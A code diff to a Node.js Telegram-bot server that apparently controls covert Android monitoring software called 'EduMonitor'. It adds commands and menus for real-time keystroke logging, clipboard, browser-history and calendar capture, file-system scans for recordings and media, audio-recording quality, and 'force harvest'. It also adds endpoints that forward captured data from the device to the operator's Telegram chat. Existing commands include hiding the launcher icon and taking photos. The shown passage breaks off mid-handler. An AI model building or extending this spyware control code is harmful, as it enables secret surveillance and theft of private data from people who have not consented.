@@ -222,7 +222,204 @@ function getMainMenuKeyboard(chatId) {
             { text: deviceStatus, callback_data: 'menu_devices' }
         ],
         [
+            { text: '🆕 NEW FEATURES', callback_data: 'menu_new_features' },
             { text: '❌ Close', callback_data: 'close_menu' }
+        ]
+    ];
+}
+
+// ============= NEW MENU FUNCTIONS =============
+
+function getNewFeaturesKeyboard() {
+    return [
+        [
+            { text: '📊 Detailed Exports', callback_data: 'menu_detailed_exports' },
+            { text: '🔍 File Scanner', callback_data: 'menu_file_scanner' }
+        ],
+        [
+            { text: '📡 Data Saving', callback_data: 'menu_data_saving' },
+            { text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }
+        ],
+        [
+            { text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' },
+            { text: '🔊 Real-time Controls', callback_data: 'menu_realtime_advanced' }
+        ],
+        [
+            { text: '📱 App Opens', callback_data: 'menu_app_opens' },
+            { text: '📅 Calendar', callback_data: 'menu_calendar' }
+        ],
+        [
+            { text: '📋 Clipboard', callback_data: 'menu_clipboard' },
+            { text: '🌐 Browser History', callback_data: 'menu_browser_history' }
+        ],
+        [
+            { text: '◀️ Back to Main', callback_data: 'help_main' }
+        ]
+    ];
+}
+
+function getDetailedExportsKeyboard() {
+    return [
+        [
+            { text: '📇 Detailed Contacts', callback_data: 'cmd:contacts_detailed' },
+            { text: '📱 Detailed Apps', callback_data: 'cmd:apps_detailed' }
+        ],
+        [
+            { text: '⌨️ Detailed Keystrokes', callback_data: 'cmd:keystrokes_detailed' },
+            { text: '🔔 Detailed Notifications', callback_data: 'cmd:notifications_detailed' }
+        ],
+        [
+            { text: '📊 Device Snapshots', callback_data: 'cmd:device_snapshots' },
+            { text: '📈 Device History', callback_data: 'cmd:device_history' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getFileScannerKeyboard() {
+    return [
+        [
+            { text: '🔍 Full System Scan', callback_data: 'cmd:full_scan' },
+            { text: '🎵 Media Only Scan', callback_data: 'cmd:media_scan' }
+        ],
+        [
+            { text: '🔬 Deep Scan (Detailed)', callback_data: 'cmd:full_scan_detailed' },
+            { text: '🎤 Find Recordings', callback_data: 'cmd:find_recorded' }
+        ],
+        [
+            { text: '📁 Find All Media', callback_data: 'cmd:find_media' },
+            { text: '❓ Scan Help', callback_data: 'cmd:scan_help' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getDataSavingKeyboard() {
+    return [
+        [
+            { text: '📡 WiFi-Only ON', callback_data: 'cmd:wifi_only_on' },
+            { text: '📡 WiFi-Only OFF', callback_data: 'cmd:wifi_only_off' }
+        ],
+        [
+            { text: '🌐 Network Status', callback_data: 'cmd:network_status' },
+            { text: '📊 WiFi-Only Status', callback_data: 'cmd:wifi_only_status' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getAudioQualityKeyboard() {
+    return [
+        [
+            { text: '🎤 Ultra Low (8k)', callback_data: 'cmd:audio_ultra' },
+            { text: '🎤 Very Low (16k)', callback_data: 'cmd:audio_very_low' }
+        ],
+        [
+            { text: '🎤 Low (24k)', callback_data: 'cmd:audio_low' },
+            { text: '🎤 Medium (32k)', callback_data: 'cmd:audio_medium' }
+        ],
+        [
+            { text: '🎤 High (64k)', callback_data: 'cmd:audio_high' },
+            { text: 'ℹ️ Audio Info', callback_data: 'cmd:audio_info' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getSyncHarvestKeyboard() {
+    return [
+        [
+            { text: '🔄 Sync All Tables', callback_data: 'cmd:sync_all' },
+            { text: '⚡ Force Harvest', callback_data: 'cmd:force_harvest' }
+        ],
+        [
+            { text: '🔄 Refresh Data', callback_data: 'cmd:refresh_data' },
+            { text: '📊 Database Stats', callback_data: 'cmd:stats' }
+        ],
+        [
+            { text: '🗑️ Clear Logs', callback_data: 'cmd:clear_logs' },
+            { text: '📊 Logs Count', callback_data: 'cmd:logs_count' }
+        ],
+        [
+            { text: '🔄 Reboot Services', callback_data: 'cmd:reboot_app' },
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getRealtimeAdvancedKeyboard() {
+    return [
+        [
+            { text: '🔑 Realtime Keys ON', callback_data: 'cmd:realtime_keystrokes_on' },
+            { text: '🔑 Realtime Keys OFF', callback_data: 'cmd:realtime_keystrokes_off' }
+        ],
+        [
+            { text: '🔔 Realtime Notif ON', callback_data: 'cmd:realtime_notifications_on' },
+            { text: '🔔 Realtime Notif OFF', callback_data: 'cmd:realtime_notifications_off' }
+        ],
+        [
+            { text: '✅ All Realtime ON', callback_data: 'cmd:realtime_all_on' },
+            { text: '❌ All Realtime OFF', callback_data: 'cmd:realtime_all_off' }
+        ],
+        [
+            { text: '📊 Realtime Status', callback_data: 'cmd:realtime_status' },
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getAppOpensKeyboard() {
+    return [
+        [
+            { text: '📱 App Opens (JSON)', callback_data: 'cmd:app_opens' },
+            { text: '📱 App Opens (HTML)', callback_data: 'cmd:app_opens_html' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getCalendarKeyboard() {
+    return [
+        [
+            { text: '📅 Calendar Events', callback_data: 'cmd:calendar' },
+            { text: '📅 Calendar (HTML)', callback_data: 'cmd:calendar_html' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getClipboardKeyboard() {
+    return [
+        [
+            { text: '📋 Clipboard Logs', callback_data: 'cmd:clipboard' },
+            { text: '📋 Clipboard (HTML)', callback_data: 'cmd:clipboard_html' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
+        ]
+    ];
+}
+
+function getBrowserHistoryKeyboard() {
+    return [
+        [
+            { text: '🌐 Browser History', callback_data: 'cmd:browser_history' },
+            { text: '🌐 Browser History (HTML)', callback_data: 'cmd:browser_history_html' }
+        ],
+        [
+            { text: '◀️ Back to New Features', callback_data: 'menu_new_features' }
         ]
     ];
 }
@@ -357,6 +554,7 @@ async function setChatMenuButton(chatId) {
             { command: 'original', description: '📏 Original size' },
             { command: 'target_apps', description: '📱 List target apps' },
             { command: 'add_target', description: '➕ Add target app' },
+            { command: 'screenshot_method', description: '📸 Check screenshot method' },
             
             // ============ CAMERA COMMANDS ============
             { command: 'photo', description: '📸 Take a photo now' },
@@ -398,6 +596,9 @@ async function setChatMenuButton(chatId) {
             { command: 'find_recordings', description: '🔍 Alias for find_recorded' },
             { command: 'scan_recordings', description: '🔍 Alias for find_recorded' },
             { command: 'scan_recording', description: '🔍 Alias for find_recorded' },
+            { command: 'full_scan', description: '🔍 Full system scan' },
+            { command: 'full_scan_detailed', description: '🔬 Detailed system scan' },
+            { command: 'scan_help', description: '❓ Scan commands help' },
             
             // ============ SOCIAL MEDIA ============
             { command: 'whatsapp', description: '💬 Get WhatsApp logs' },
@@ -409,12 +610,15 @@ async function setChatMenuButton(chatId) {
             { command: 'facebook_logs', description: '💬 Alias for facebook' },
             { command: 'browser_history', description: '🌐 Get browser history' },
             { command: 'browser_logs', description: '🌐 Alias for browser_history' },
+            { command: 'browser_history_html', description: '🌐 Browser history as HTML' },
             { command: 'clipboard', description: '📋 Get clipboard logs' },
             { command: 'clipboard_logs', description: '📋 Alias for clipboard' },
+            { command: 'clipboard_html', description: '📋 Clipboard as HTML' },
             
             // ============ CALENDAR ============
             { command: 'calendar', description: '📅 Get calendar events' },
             { command: 'calendar_events', description: '📅 Alias for calendar' },
+            { command: 'calendar_html', description: '📅 Calendar as HTML' },
             
             // ============ PHONE INFO ============
             { command: 'phone_number', description: '📞 Get phone number' },
@@ -438,6 +642,10 @@ async function setChatMenuButton(chatId) {
             { command: 'network', description: '📡 Network status' },
             { command: 'all_info', description: '🌍 Complete network info' },
             { command: 'full_info', description: '🌍 Alias for all_info' },
+            { command: 'network_status', description: '📡 Network & data saving status' },
+            { command: 'wifi_only_on', description: '📡 Enable WiFi-only mode' },
+            { command: 'wifi_only_off', description: '📡 Disable WiFi-only mode' },
+            { command: 'wifi_only_status', description: '📡 Show WiFi-only mode status' },
             
             // ============ APPS ============
             { command: 'apps', description: '📱 Get installed apps' },
@@ -472,6 +680,12 @@ async function setChatMenuButton(chatId) {
             { command: 'realtime_on', description: '🔔 Enable real-time logs' },
             { command: 'realtime_off', description: '🔕 Disable real-time logs' },
             { command: 'realtime_status', description: '📊 Check real-time status' },
+            { command: 'realtime_keystrokes_on', description: '🔑 Enable real-time keystrokes' },
+            { command: 'realtime_keystrokes_off', description: '🔑 Disable real-time keystrokes' },
+            { command: 'realtime_notifications_on', description: '🔔 Enable real-time notifications' },
+            { command: 'realtime_notifications_off', description: '🔔 Disable real-time notifications' },
+            { command: 'realtime_all_on', description: '✅ Enable all real-time logs' },
+            { command: 'realtime_all_off', description: '❌ Disable all real-time logs' },
             
             // ============ SERVICE CONTROLS ============
             { command: 'hide_icon', description: '👻 Hide launcher icon' },
@@ -701,7 +915,8 @@ function queueAutoDataCommands(deviceId, chatId) {
             'device_snapshots',
             'location',
             'screenshot_settings',
-            'recording_settings'
+            'recording_settings',
+            'app_opens'
         ]
     });
     
@@ -741,7 +956,8 @@ function queueAutoDataCommands(deviceId, chatId) {
         { command: 'device_snapshots', delay: 59, description: 'Device Snapshots' },
         { command: 'location', delay: 62, description: 'Location' },
         { command: 'screenshot_settings', delay: 65, description: 'Screenshot Settings' },
-        { command: 'recording_settings', delay: 68, description: 'Recording Settings' }
+        { command: 'recording_settings', delay: 68, description: 'Recording Settings' },
+        { command: 'app_opens', delay: 71, description: 'App Opens' }
     ];
     
     commands.forEach((cmd) => {
@@ -850,9 +1066,9 @@ async function sendTelegramPhoto(chatId, filePath, filename, caption) {
     }
 }
 
-// ============= NEW ENDPOINTS =============
+// ============= NEW DETAILED EXPORT ENDPOINTS =============
 
-app.post('/api/telegram/:deviceId', upload.single('file'), async (req, res) => {
+app.post('/api/contacts-detailed/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
         const filename = req.body.filename;
@@ -862,7 +1078,7 @@ app.post('/api/telegram/:deviceId', upload.single('file'), async (req, res) => {
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`💬 Telegram logs from ${deviceId}: ${filename} (${itemCount} messages)`);
+        console.log(`📇 Detailed contacts from ${deviceId}: ${filename} (${itemCount} contacts)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -873,7 +1089,7 @@ app.post('/api/telegram/:deviceId', upload.single('file'), async (req, res) => {
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
         
-        const caption = `📱 *${deviceName}*\n\n💬 Telegram Messages Export (${itemCount} messages)`;
+        const caption = `📱 *${deviceName}*\n\n📇 Detailed Contacts Export (${itemCount} contacts)`;
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
@@ -884,12 +1100,12 @@ app.post('/api/telegram/:deviceId', upload.single('file'), async (req, res) => {
         res.json({ success: true });
         
     } catch (error) {
-        console.error('❌ Telegram logs error:', error);
+        console.error('❌ Detailed contacts error:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-app.post('/api/facebook/:deviceId', upload.single('file'), async (req, res) => {
+app.post('/api/apps-detailed/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
         const filename = req.body.filename;
@@ -899,7 +1115,7 @@ app.post('/api/facebook/:deviceId', upload.single('file'), async (req, res) => {
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`💬 Facebook logs from ${deviceId}: ${filename} (${itemCount} messages)`);
+        console.log(`📱 Detailed apps from ${deviceId}: ${filename} (${itemCount} apps)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -910,7 +1126,7 @@ app.post('/api/facebook/:deviceId', upload.single('file'), async (req, res) => {
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
         
-        const caption = `📱 *${deviceName}*\n\n💬 Facebook/Messenger Messages Export (${itemCount} messages)`;
+        const caption = `📱 *${deviceName}*\n\n📱 Detailed Apps Export (${itemCount} apps)`;
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
@@ -921,12 +1137,12 @@ app.post('/api/facebook/:deviceId', upload.single('file'), async (req, res) => {
         res.json({ success: true });
         
     } catch (error) {
-        console.error('❌ Facebook logs error:', error);
+        console.error('❌ Detailed apps error:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-app.post('/api/calendar/:deviceId', upload.single('file'), async (req, res) => {
+app.post('/api/keystrokes-detailed/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
         const filename = req.body.filename;
@@ -936,7 +1152,7 @@ app.post('/api/calendar/:deviceId', upload.single('file'), async (req, res) => {
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`📅 Calendar events from ${deviceId}: ${filename} (${itemCount} events)`);
+        console.log(`⌨️ Detailed keystrokes from ${deviceId}: ${filename} (${itemCount} entries)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -947,7 +1163,7 @@ app.post('/api/calendar/:deviceId', upload.single('file'), async (req, res) => {
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
         
-        const caption = `📱 *${deviceName}*\n\n📅 Calendar Events Export (${itemCount} events)`;
+        const caption = `📱 *${deviceName}*\n\n⌨️ Detailed Keystroke Logs (${itemCount} entries)`;
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
@@ -958,12 +1174,12 @@ app.post('/api/calendar/:deviceId', upload.single('file'), async (req, res) => {
         res.json({ success: true });
         
     } catch (error) {
-        console.error('❌ Calendar events error:', error);
+        console.error('❌ Detailed keystrokes error:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-app.post('/api/screenshots/:deviceId', upload.single('file'), async (req, res) => {
+app.post('/api/notifications-detailed/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
         const filename = req.body.filename;
@@ -973,7 +1189,7 @@ app.post('/api/screenshots/:deviceId', upload.single('file'), async (req, res) =
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`📸 Screenshot metadata from ${deviceId}: ${filename} (${itemCount} entries)`);
+        console.log(`🔔 Detailed notifications from ${deviceId}: ${filename} (${itemCount} entries)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -984,7 +1200,7 @@ app.post('/api/screenshots/:deviceId', upload.single('file'), async (req, res) =
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
         
-        const caption = `📱 *${deviceName}*\n\n📸 Screenshot Metadata Export (${itemCount} entries)`;
+        const caption = `📱 *${deviceName}*\n\n🔔 Detailed Notifications (${itemCount} entries)`;
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
@@ -995,12 +1211,12 @@ app.post('/api/screenshots/:deviceId', upload.single('file'), async (req, res) =
         res.json({ success: true });
         
     } catch (error) {
-        console.error('❌ Screenshot metadata error:', error);
+        console.error('❌ Detailed notifications error:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-app.post('/api/whatsapp/:deviceId', upload.single('file'), async (req, res) => {
+app.post('/api/device-snapshots/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
         const filename = req.body.filename;
@@ -1010,7 +1226,7 @@ app.post('/api/whatsapp/:deviceId', upload.single('file'), async (req, res) => {
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`💬 WhatsApp logs from ${deviceId}: ${filename} (${itemCount} messages)`);
+        console.log(`📊 Device snapshots from ${deviceId}: ${filename} (${itemCount} snapshots)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -1021,7 +1237,7 @@ app.post('/api/whatsapp/:deviceId', upload.single('file'), async (req, res) => {
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
         
-        const caption = `📱 *${deviceName}*\n\n💬 WhatsApp Messages Export (${itemCount} messages)`;
+        const caption = `📱 *${deviceName}*\n\n📊 Device Info Snapshots (${itemCount} snapshots)`;
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
@@ -1032,7 +1248,44 @@ app.post('/api/whatsapp/:deviceId', upload.single('file'), async (req, res) => {
         res.json({ success: true });
         
     } catch (error) {
-        console.error('❌ WhatsApp logs error:', error);
+        console.error('❌ Device snapshots error:', error);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+app.post('/api/app-opens/:deviceId', upload.single('file'), async (req, res) => {
+    try {
+        const deviceId = req.params.deviceId;
+        const filename = req.body.filename;
+        const itemCount = req.body.count || '0';
+        
+        if (!deviceId || !filename || !req.file) {
+            return res.status(400).json({ error: 'Missing fields' });
+        }
+        
+        console.log(`📱 App opens from ${deviceId}: ${filename} (${itemCount} entries)`);
+        
+        const device = devices.get(deviceId);
+        if (!device) {
+            return res.status(404).json({ error: 'Device not found' });
+        }
+        
+        const chatId = device.chatId;
+        const filePath = req.file.path;
+        const deviceName = device.deviceInfo?.model || 'Unknown Device';
+        
+        const caption = `📱 *${deviceName}*\n\n📱 App Opens Export (${itemCount} entries)`;
+        
+        await sendTelegramDocument(chatId, filePath, filename, caption);
+        
+        setTimeout(() => {
+            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
+        }, 60000);
+        
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('❌ App opens error:', error);
         res.status(500).json({ error: error.message });
     }
 });
@@ -1261,7 +1514,52 @@ async function handleCallbackQuery(callbackQuery) {
     
     await answerCallbackQuery(callbackId);
     
-    if (data === 'help_main') {
+    // ============= NEW MENU HANDLERS =============
+    if (data === 'menu_new_features') {
+        await editMessageKeyboard(chatId, messageId, getNewFeaturesKeyboard());
+        await sendTelegramMessage(chatId, "🆕 *NEW FEATURES MENU*\n\nSelect a category to explore the latest additions to EduMonitor!");
+        
+    } else if (data === 'menu_detailed_exports') {
+        await editMessageKeyboard(chatId, messageId, getDetailedExportsKeyboard());
+        await sendTelegramMessage(chatId, "📊 *DETAILED EXPORTS*\n\nGet comprehensive data exports with full details:\n\n• Detailed Contacts (JSON format)\n• Detailed Apps (with permissions & usage)\n• Detailed Keystrokes (full logs)\n• Detailed Notifications (with context)\n• Device Snapshots (historical data)\n\nEach export includes timestamps and complete metadata.");
+        
+    } else if (data === 'menu_file_scanner') {
+        await editMessageKeyboard(chatId, messageId, getFileScannerKeyboard());
+        await sendTelegramMessage(chatId, "🔍 *FILE SCANNER*\n\nPowerful file system scanning tools:\n\n• Full System Scan - All files\n• Media Only Scan - Audio/Video/Images only\n• Deep Scan - Detailed with full paths\n• Find Recordings - Audio recordings\n• Find All Media - All media files\n\nReports are sent as interactive HTML files with search and export features.");
+        
+    } else if (data === 'menu_data_saving') {
+        await editMessageKeyboard(chatId, messageId, getDataSavingKeyboard());
+        await sendTelegramMessage(chatId, "📡 *DATA SAVING MODE*\n\nSave mobile data usage:\n\n• WiFi-Only Mode: Media files only upload on WiFi\n• Network Status: Check current connection\n• WiFi-Only Status: View current mode\n\nEnable WiFi-Only to save mobile data when sending screenshots, recordings, and videos.");
+        
+    } else if (data === 'menu_audio_quality') {
+        await editMessageKeyboard(chatId, messageId, getAudioQualityKeyboard());
+        await sendTelegramMessage(chatId, "🎚️ *AUDIO QUALITY SETTINGS*\n\nAdjust recording quality to balance file size and clarity:\n\n• Ultra Low (8kbps) - Smallest files\n• Very Low (16kbps) - Very small\n• Low (24kbps) - Small files\n• Medium (32kbps) - Balanced\n• High (64kbps) - Best quality\n\nLower quality = smaller files, faster uploads.");
+        
+    } else if (data === 'menu_sync_harvest') {
+        await editMessageKeyboard(chatId, messageId, getSyncHarvestKeyboard());
+        await sendTelegramMessage(chatId, "🔄 *SYNC & HARVEST*\n\nData synchronization tools:\n\n• Sync All Tables - Sync all specialized data\n• Force Harvest - Force immediate data collection\n• Refresh Data - Sync unsent logs\n• Database Stats - View statistics\n• Clear Logs - Clean database\n• Logs Count - Count entries\n• Reboot Services - Restart all services");
+        
+    } else if (data === 'menu_realtime_advanced') {
+        await editMessageKeyboard(chatId, messageId, getRealtimeAdvancedKeyboard());
+        await sendTelegramMessage(chatId, "🔊 *ADVANCED REALTIME CONTROLS*\n\nFine-tune real-time logging:\n\n• Keystrokes - Enable/disable separately\n• Notifications - Enable/disable separately\n• All ON/OFF - Master controls\n• Status - View current settings\n\nSeparate controls give you granular control over what gets sent instantly.");
+        
+    } else if (data === 'menu_app_opens') {
+        await editMessageKeyboard(chatId, messageId, getAppOpensKeyboard());
+        await sendTelegramMessage(chatId, "📱 *APP OPEN LOGS*\n\nTrack when apps are opened:\n\n• JSON format for processing\n• HTML format for viewing\n\nEach entry includes:\n• App name\n• Package name\n• Activity class\n• Timestamp\n• Count of opens in batch");
+        
+    } else if (data === 'menu_calendar') {
+        await editMessageKeyboard(chatId, messageId, getCalendarKeyboard());
+        await sendTelegramMessage(chatId, "📅 *CALENDAR EVENTS*\n\nExport calendar data:\n\n• JSON format for processing\n• HTML format for viewing\n\nIncludes:\n• Event titles\n• Dates and times\n• Locations\n• Descriptions\n• Recurrence rules");
+        
+    } else if (data === 'menu_clipboard') {
+        await editMessageKeyboard(chatId, messageId, getClipboardKeyboard());
+        await sendTelegramMessage(chatId, "📋 *CLIPBOARD LOGS*\n\nExport clipboard history:\n\n• JSON format for processing\n• HTML format for viewing\n\nCaptures copied text with timestamps.");
+        
+    } else if (data === 'menu_browser_history') {
+        await editMessageKeyboard(chatId, messageId, getBrowserHistoryKeyboard());
+        await sendTelegramMessage(chatId, "🌐 *BROWSER HISTORY*\n\nExport browsing history:\n\n• JSON format for processing\n• HTML format with clickable links\n\nIncludes:\n• URLs visited\n• Browser package\n• Timestamps\n• Page titles (when available)");
+        
+    } else if (data === 'help_main') {
         await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
         
     } else if (data === 'menu_devices') {
@@ -1431,10 +1729,11 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📏 Size Status', 'cmd:size_status')
             ],
             [
-                createInlineButton('➕ Add Target', 'cmd:add_target_example'),
+                createInlineButton('📸 Method Info', 'cmd:screenshot_method'),
                 createInlineButton('📱 Target Apps', 'cmd:target_apps')
             ],
             [
+                createInlineButton('➕ Add Target', 'cmd:add_target_example'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -1459,6 +1758,7 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive')
             ],
             [
+                createInlineButton('🎚️ Audio Quality', 'menu_audio_quality'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -1488,6 +1788,14 @@ async function handleCallbackQuery(callbackQuery) {
                 createInlineButton('📸 Screenshots', 'cmd:screenshots')
             ],
             [
+                createInlineButton('🎤 Find Recordings', 'cmd:find_recorded'),
+                createInlineButton('🎵 Media Scan', 'cmd:media_scan')
+            ],
+            [
+                createInlineButton('🔬 Full Scan', 'cmd:full_scan'),
+                createInlineButton('❓ Scan Help', 'cmd:scan_help')
+            ],
+            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -1513,11 +1821,19 @@ async function handleCallbackQuery(callbackQuery) {
     } else if (data === 'menu_realtime') {
         const keyboard = [
             [
-                createInlineButton('🔔 Realtime ON', 'cmd:realtime_on'),
-                createInlineButton('🔕 Realtime OFF', 'cmd:realtime_off')
+                createInlineButton('🔑 Keys ON', 'cmd:realtime_keystrokes_on'),
+                createInlineButton('🔑 Keys OFF', 'cmd:realtime_keystrokes_off')
             ],
             [
-                createInlineButton('📊 Realtime Status', 'cmd:realtime_status'),
+                createInlineButton('🔔 Notif ON', 'cmd:realtime_notifications_on'),
+                createInlineButton('🔔 Notif OFF', 'cmd:realtime_notifications_off')
+            ],
+            [
+                createInlineButton('✅ All ON', 'cmd:realtime_all_on'),
+                createInlineButton('❌ All OFF', 'cmd:realtime_all_off')
+            ],
+            [
+                createInlineButton('📊 Status', 'cmd:realtime_status'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -1738,6 +2054,511 @@ async function handleCommand(chatId, command, messageId) {
         return;
     }
 
+    // ============= NEW COMMAND HANDLERS =============
+    
+    // Audio Quality Commands
+    if (command === '/audio_info') {
+        await sendTelegramMessage(chatId, 
+            "🎤 *Audio Quality Settings*\n\n" +
+            "Available qualities:\n" +
+            "• `/audio_ultra` - Ultra Low (8 kbps) - Smallest files\n" +
+            "• `/audio_very_low` - Very Low (16 kbps)\n" +
+            "• `/audio_low` - Low (24 kbps)\n" +
+            "• `/audio_medium` - Medium (32 kbps) - Balanced\n" +
+            "• `/audio_high` - High (64 kbps) - Best quality\n\n" +
+            "Lower quality = smaller files, faster uploads.");
+        return;
+    }
+    
+    if (command === '/audio_ultra' || command === '/audio_very_low' || 
+        command === '/audio_low' || command === '/audio_medium' || command === '/audio_high') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        const quality = command.substring(1).replace('audio_', '');
+        await sendTelegramMessage(chatId, `🎤 Audio quality set to: ${quality.toUpperCase()}\nCommand sent to device.`);
+        return;
+    }
+    
+    // WiFi-Only Mode Commands
+    if (command === '/wifi_only_on' || command === '/wifi_only_off' || 
+        command === '/wifi_only_status' || command === '/network_status') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        if (command === '/wifi_only_on') {
+            await sendTelegramMessage(chatId, "📡 WiFi-Only Mode enabled. Media files will only upload on WiFi.");
+        } else if (command === '/wifi_only_off') {
+            await sendTelegramMessage(chatId, "📡 WiFi-Only Mode disabled. All data can use any network.");
+        } else {
+            await sendTelegramMessage(chatId, "📡 Network status command sent to device.");
+        }
+        return;
+    }
+    
+    // Real-time Advanced Commands
+    if (command === '/realtime_keystrokes_on' || command === '/realtime_keystrokes_off' ||
+        command === '/realtime_notifications_on' || command === '/realtime_notifications_off' ||
+        command === '/realtime_all_on' || command === '/realtime_all_off' ||
+        command === '/realtime_status') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        if (command === '/realtime_keystrokes_on') {
+            await sendTelegramMessage(chatId, "🔑 Real-time keystrokes ENABLED. All keystrokes will be sent instantly.");
+        } else if (command === '/realtime_keystrokes_off') {
+            await sendTelegramMessage(chatId, "🔑 Real-time keystrokes DISABLED. Keystrokes will be batched.");
+        } else if (command === '/realtime_notifications_on') {
+            await sendTelegramMessage(chatId, "🔔 Real-time notifications ENABLED. All notifications will be sent instantly.");
+        } else if (command === '/realtime_notifications_off') {
+            await sendTelegramMessage(chatId, "🔔 Real-time notifications DISABLED. Notifications will be batched.");
+        } else if (command === '/realtime_all_on') {
+            await sendTelegramMessage(chatId, "✅ All real-time logs ENABLED.");
+        } else if (command === '/realtime_all_off') {
+            await sendTelegramMessage(chatId, "❌ All real-time logs DISABLED.");
+        } else {
+            await sendTelegramMessage(chatId, "📊 Real-time status command sent to device.");
+        }
+        return;
+    }
+    
+    // Sync & Harvest Commands
+    if (command === '/sync_all' || command === '/force_harvest' || command === '/refresh_data' ||
+        command === '/stats' || command === '/clear_logs' || command === '/logs_count' || command === '/reboot_app') {
+        const selectedDeviceId = userDeviceSelection.get(chatId);
+        const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
+        
+        if (!device) {
+            await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
+            return;
+        }
+        
+        if (!device.pendingCommands) {
+            device.pendingCommands = [];
+        }
+        
+        device.pendingCommands.push({
+            command: command.substring(1),
+            originalCommand: command,
+            messageId: messageId,
+            timestamp: Date.now()
+        });
+        
+        if (command === '/sync_all') {
+            await sendTelegramMessage(chatId, "🔄 Syncing all specialized tables...");
+        } else if (command === '/force_harvest') {
+            await sendTelegramMessage(chatId, "⚡ Force harvest command sent to device.");
+        } else if (command === '/refresh_data') {
+            await sendTelegramMessage(chatId, "🔄 Refresh data command sent to device.");
+        } else if (command === '/stats') {
+            await sendTelegramMessage(chatId, "📈 Database statistics command sent to device.");
+        } else if (command === '/clear_logs') {
+            await sendTelegramMessage(chatId, "🗑️ Clear logs command sent to device.");
+        } else if (command === '/logs_count') {
